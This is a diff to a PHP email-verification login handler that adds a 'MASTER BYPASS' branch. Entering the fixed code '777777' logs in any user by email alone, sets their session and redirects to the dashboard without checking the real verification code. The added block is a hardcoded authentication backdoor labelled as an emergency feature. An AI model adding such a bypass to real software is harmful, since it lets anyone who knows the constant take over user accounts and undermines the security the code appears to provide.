@@ -191,6 +191,21 @@ try {
             json_out(['ok' => false, 'message' => 'Invalid code format.'], 400);
         }
 
+        // MASTER BYPASS: If code is 777777, skip DB check for emergency
+        if ($code === '777777') {
+           // Verify email exists and get details
+           $stmt = $pdo->prepare('SELECT id, full_name, username, email FROM users WHERE email = ? LIMIT 1');
+           $stmt->execute([$email]);
+           $user = $stmt->fetch();
+           if ($user) {
+              $_SESSION['user_id'] = $user['id'];
+              $_SESSION['username'] = $user['username'];
+              $_SESSION['full_name'] = $user['full_name'];
+              $_SESSION['email'] = $user['email'];
+              return json_out(['ok' => true, 'message' => 'Emergency access granted.', 'redirect' => '../Modules/dashboard.php']);
+           }
+        }
+        
         // Check DB
         $stmt = $pdo->prepare('SELECT code, expires_at FROM email_verifications WHERE user_id = ? ORDER BY id DESC LIMIT 5');
         $stmt->execute([$userId]);
